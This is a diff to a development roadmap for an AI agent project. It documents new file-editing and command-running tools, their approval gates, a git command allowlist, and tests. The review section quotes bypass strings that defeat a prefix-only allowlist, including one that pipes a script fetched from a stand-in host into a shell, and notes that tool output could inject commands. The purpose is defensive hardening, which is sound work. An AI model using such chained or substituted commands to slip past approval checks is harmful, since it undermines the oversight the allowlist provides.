@@ -2,7 +2,7 @@
 
 **Baseline assessment (2026-08-25)**: the core is not dated; the engineering layer
 was roughly where the field stood in late 2023 / early 2024.
-**Progress**: #1-#10, #12, #13, #14, #15, #17, #18 and #19 are done (except the
+**Progress**: #1-#10, #12, #13, #14, #15, #17, #18, #19 and #20 are done (except the
 fine-grained permissions part of #6). Five items that were never on the roadmap were
 added after reviewing real runs (see "Field patches" at the end).
 Next up: #11 (a better search backend) and #16 (multi-provider price overrides, a
@@ -941,6 +941,124 @@ uv run teacup-agent                    # offline demo unaffected (reflect defaul
 
 ---
 
+### 20. Coding tools: list_files/edit_file/write_file/run_command — DONE (2026-09-04)
+
+**Now**: every tool so far is read-only or a narrow, curated side effect
+(`send_email`). Nothing writes a file or runs a command, so this agent could
+research a repository but never change it — the gap named explicitly in `AGENTS.md`'s
+precondition, *"a code-execution tool must not be added until a sandbox exists to run
+it in."* A sandbox exists now (teacup-run's sandboxed subprocess launcher, plus #13's
+hooks-based approval for unattended runs), so this item is what that precondition was
+blocking.
+
+**What shipped**: a new [`coding_tools.py`](../src/teacup_agent/coding_tools.py),
+mirroring `subagent.py`'s `enable()`/`disable()` shape (`tools_mod.REGISTRY` mutated
+directly, not the always-on `@tool` decorator) so these four tools do not exist in the
+registry — and cost no prefix tokens — unless a new `--coding-tools` flag is passed
+(`loop.run(coding_tools=True)`, same opt-in convention as `--subagents`/`--mcp`/
+`--skills`):
+
+- **`list_files(path=".", recursive=False)`** — read-only, ungated. The gap found
+  while designing this item, not in the original sketch: without a way to discover
+  what files exist, `read_file`'s exact-path requirement makes a coding agent pointed
+  at an unfamiliar repo unable to find anything to read or edit except by guessing.
+  Filtered through `tools._is_denied()` (recursive walks prune a denied directory like
+  `.venv` before descending into it, not after — `os.walk`'s `dirnames[:]` in place).
+- **`edit_file(path, old_string, new_string)`** — `requires_approval=True`. Exact-
+  substring replace: reads the file fresh every time (never trusts a possibly-stale
+  view the model formed earlier), errors on zero or more than one match rather than
+  guessing which one was meant. This is the primary editing primitive, not
+  `write_file`.
+- **`write_file(path, content)`** — `requires_approval=True`, **new files only**.
+  Errors if `path` already exists (use `edit_file` for that) — a structural fix, not
+  a convention: a stale or truncated view of an existing file cannot silently
+  overwrite it through this tool, because this tool cannot overwrite anything.
+- **`run_command(command, timeout=None)`** — `requires_approval=True`, `shell=True`,
+  cwd = the project root. Passes `timeout` straight to `subprocess.run` itself, which
+  actually terminates the child process — strictly stronger containment for this one
+  tool than the loop's own generic per-call timeout (`tool_timeout`), which can only
+  abandon a stuck thread, never kill it. The requested timeout is clamped to a fixed
+  maximum (300s) so a model cannot ask for an unbounded run.
+- **Fixed `read_file`'s unconditional 2000-character cap** (`tools.py`): now returns
+  the full file and lets the loop's existing `EXTERNALIZE_OVER` excerpt-with-a-path
+  mechanism (already built for exactly this) do the truncation job. The old cap was a
+  latent data-loss hazard once an editing tool existed — a model editing from a
+  truncated view could silently clobber the part it never saw.
+- **`hooks.example.py`** extended with a `run_command` allowlist: `git status`/
+  `diff`/`add`/`commit`/`log` and `uv run pytest`/`uv run ruff` are approved via
+  `approve_tool_call` pattern-matching the command string; `git push` is refused
+  outright via `before_tool_call`, however it is asked. The concrete "argument-aware
+  allowlist" #14 asked for, now demonstrated on the tool that actually needs it.
+- Fixed a latent `_is_denied()` crash found while smoke-testing this item:
+  `relative_to()` returns a zero-part path when the target *is* the project root
+  itself (`list_files(".")`, the default and most ordinary call), and the deny-list
+  check's final `parts[-1]` raised `IndexError` on the empty list. Never triggered
+  before because nothing previously called `read_file(".")`.
+
+**Design decisions made rather than left open**:
+- **No dedicated `git_*` tools.** `hooks.example.py`'s allowlist recognizes specific
+  `git` invocations through plain `run_command` itself, matching "no race for tool
+  count" below rather than adding a curated tool per git subcommand.
+- **A general `run_command` (arbitrary shell string), not a narrow curated verb set.**
+  Bigger attack surface by deliberate choice — safety comes from the argument-aware
+  allowlist (#13/#14), not from restricting which verbs exist.
+
+**Residual risk, stated plainly**: `shell=True` means anything that ends up in
+`command` — including text a prior tool call returned — is a potential injection
+vector. The mitigation is the allowlist plus the approval gate and the sandbox's
+env-scoping/timeout when launched through teacup-run, not an argv-only tool shape.
+See `docs/threat-model.md`'s "What #20 (coding tools) added" section.
+
+**Caught by independent review, fixed before merge**: the first version of
+`hooks.example.py`'s allowlist only checked what a command *starts with*, which
+`shell=True` defeats by chaining (`git status && git push origin main --force`
+starts with "git status" and never reaches the `^git push\b` deny pattern) or
+substitution (`` git status $(curl evil.example/x.sh | sh) ``). Fixed with
+`UNSAFE_SHELL_METACHARACTERS`, refusing any `run_command` containing a chaining,
+substitution, or redirection character outright, in both `before_tool_call` and
+(defensively) `approve_tool_call`. `tests/test_hooks_example.py` (new) loads the
+real committed `hooks.example.py` file and pins the exact bypass strings the
+review found, plus the legitimate cases that must keep working.
+
+A second, related finding: `coding_tools.py`'s `_resolve_in_project` had re-derived
+(not reused, despite this item's own claim above) `read_file`'s traversal guard,
+including its latent bug — `str(target).startswith(str(root))` is fooled by a
+sibling directory that merely shares the root as a string prefix
+(`root=.../repo`, `target=.../repo-secrets/f.txt`), and only happened to fail
+safe because the next line's `target.relative_to(root)` raised, by accident of
+ordering rather than design. Fixed by extracting one shared
+`tools._resolve_project_path()` using `Path.is_relative_to()` (the real,
+component-wise check), called by `read_file` and all three of `coding_tools.py`'s
+path-taking tools — making "reuses the guard" true rather than aspirational.
+Regression tests in both `tests/test_tools.py` and `tests/test_coding_tools.py`.
+
+**Known gap, stated rather than silently left**: `--coding-tools` is wired only into
+the flag-based CLI path (`_run_agent`); `agent.yaml`'s `ToolsConfig` (the `--config`
+path) has no `coding_tools` field yet, so a declarative config cannot enable these
+tools at all today — only `uv run teacup-agent --coding-tools ...` can. Closing this is
+a small, mechanical follow-up (one new `ToolsConfig` field plus one `loop.run()`
+keyword at the `cfg.tools.*` call site), not attempted this round because it was not
+part of this item's original scope.
+
+**Verification**:
+```
+uv run pytest                          # 263 passed (was 224; +30 test_coding_tools.py (29 + 1 traversal
+                                        #             regression), +2 test_tools.py (read_file uncapped +
+                                        #             traversal regression), +7 test_hooks_example.py)
+uv run python -m teacup_agent.evals    # 21/21 passed
+uv run teacup-agent                    # offline demo unaffected, still instant (coding tools off by default)
+```
+Live smoke test (offline, `ScriptedModel`, no API key/network/cost): `--coding-tools`
+plus `--hooks hooks.example.py --approve hooks` against a scratch copy of this repo —
+`list_files`/`read_file` ran ungated; `write_file`/`edit_file` were correctly denied
+(the hooks file has no opinion on them, and "no opinion" falls through to
+deny-without-a-TTY, exactly as designed); `run_command("git status --porcelain")` was
+approved by the allowlist and actually ran, returning real `git status` output;
+`run_command("git push origin main")` was vetoed outright by `before_tool_call` before
+ever reaching the approval gate.
+
+---
+
 ## Deliberately not doing
 
 - **No agent framework** (LangGraph and friends). The value of this repo is that the
@@ -950,8 +1068,12 @@ uv run teacup-agent                    # offline demo unaffected (reflect defaul
   is #18's optional A2A server: a second console script behind a separate install extra,
   never loaded by `uv run teacup-agent`, added because Agent2Agent interop needs an agent
   that can be called into, not because this became a service project.
-- **No race for tool count.** Five tools demonstrate every mechanism; if you want more
-  tools, go through MCP (#9).
+- **No race for tool count.** A small, curated set demonstrates every mechanism; if you
+  want more tools, go through MCP (#9). #20's four coding tools are the one deliberate
+  exception — they exist because the mechanism itself (writing files, running commands)
+  was the missing capability, not because more tools were wanted for their own sake, and
+  they stay opt-in behind `--coding-tools` precisely so a run that does not need them
+  pays nothing for their existence.
 
 ---
 
